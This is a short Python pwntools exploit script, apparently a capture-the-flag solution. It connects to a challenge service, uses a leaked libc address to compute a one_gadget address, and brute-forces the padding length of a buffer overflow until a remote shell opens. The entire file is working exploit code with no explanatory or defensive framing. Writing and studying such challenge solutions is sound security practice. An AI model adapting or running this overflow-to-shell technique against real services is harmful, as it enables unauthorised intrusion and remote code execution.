from pwn import *
for i in range(69,90):
	p=remote("dorsia1.wpictf.xyz",31337)
#p=process("./pwn")
	leak=p.recvline()
	SYSTEM=int(leak,16)-765772
	BASE=SYSTEM-0x0004f440
	log.info("System address: "+hex(SYSTEM))
	log.info("Base: "+hex(BASE))
	one_gadget=BASE+0x0004f322
	log.info("One gadget: "+hex(one_gadget))
	payload="\x00"*i
	payload+=p64(one_gadget)
	p.sendline(payload)
	p.sendline("id")
	try:
		data=p.recvline()
		if "gid" in data: 
			log.info("Fouuund!")
			p.interactive()
	except Exception:
		continue
